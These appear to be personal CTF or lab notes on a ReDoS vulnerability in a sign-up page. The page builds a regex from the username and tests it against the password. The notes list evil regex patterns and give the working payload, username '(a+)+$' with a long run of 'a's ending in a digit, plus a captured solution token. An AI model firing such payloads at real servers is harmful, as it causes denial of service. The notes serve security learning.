

Regularly use to Express their string pattern matching specifications had an Evil side?: **Regex**

https://secupress.me/blog/evil-regex-the-redos-case/
https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS


![[Pasted image 20260719144249.png]]

![[Pasted image 20260719145452.png]]

# Question 1 


Q1) Find a one-hit server resource exhaustion vulnerability **on the sign up page. That is, you need to send a single request that makes the server work unexpectedly hard, waste resources, and eventually throw a timeout.** **You’ll get your solution token with the timeout error.** This means **DDos
*
## Evil Regex*

https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

https://stackoverflow.com/questions/12841970/how-can-i-recognize-an-evil-regex

**Evil Regex contains**:

- Grouping with repetition
- Inside the repeated group:
    - Repetition
    - Alternation with overlapping

**Examples of Evil Regex**:

- `(a+)+$`
- `([a-zA-Z]+)*$`
- `(a|aa)+$`
- `(a|a?)+$`



![[Pasted image 20260719151339.png]]

It said sign up page 

![[Pasted image 20260719154347.png]]

function hide(id) {
    document.getElementById(id).style.display = "none";
}

function show(id) {
    document.getElementById(id).style.display = "block";
}

document.addEventListener("DOMContentLoaded", function() {
    hide("length");
    hide("blank");
    hide("charset");
    hide("match");
    hide("weakpass");
});

function validate() {

    name = document.forms["signup_form"]["username"].value;
    pass = document.forms["signup_form"]["password"].value;
    conf = document.forms["signup_form"]["confirm"].value;

    submit = true;

    hide("server-flash");
    
    if (name > 16) {
        submit = false;
        show("length");
    } else {
        hide("length");
    }

    if (name == "" || pass == "") {
        submit = false;
        show("blank");
    } else {
        hide("blank");
    }

    if (/^[a-zA-Z0-9]+$/.test(pass) == false) {
        submit = false;
        show("charset");
    } else {
        hide("charset");
    }

    if (pass != conf) {
        submit = false;
        show("match");
    } else {
        hide("match");
    }

    var regex = new RegExp(name, "i");
    if (regex.test(pass)) {
        submit = false;
        show("weakpass");
    } else {
        hide("weakpass");
    }

    return submit;
}


var regex = new RegExp(name, "i"); if (regex.test(pass)) {


- **username**: `(a+)+$` — classic catastrophic-backtracking pattern (nested quantifier, anchored to end)
- **password**: a long run of `a`'s that _fails to match_ at the very end, e.g. 40 `a`'s followed by a digit:

```
  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1
```

![[Pasted image 20260719161559.png]]

`baccbd9516668cbab97fc5bcf0c9efc35330a09a3cb3e0a38daaec5991f6b034`
